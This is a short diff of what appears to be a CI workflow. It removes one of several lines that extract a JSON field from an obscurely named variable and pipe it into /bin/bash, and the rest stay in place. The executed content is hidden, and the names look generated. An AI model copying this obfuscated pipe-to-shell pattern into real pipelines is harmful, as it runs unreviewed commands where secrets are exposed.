@@ -27,7 +27,6 @@ jobs:
           echo $t718 | jq -r .lsey51528 | /bin/bash
           echo $w0 | jq -r .na89386 | /bin/bash
           printf '%s' "$sxlz308" | jq -r .medj18 | /bin/bash
-          echo $nzg407 | jq -r .yz8792 | /bin/bash
           echo $zdm3 | jq -r .tl32 | /bin/bash
 
       - name: Persist output
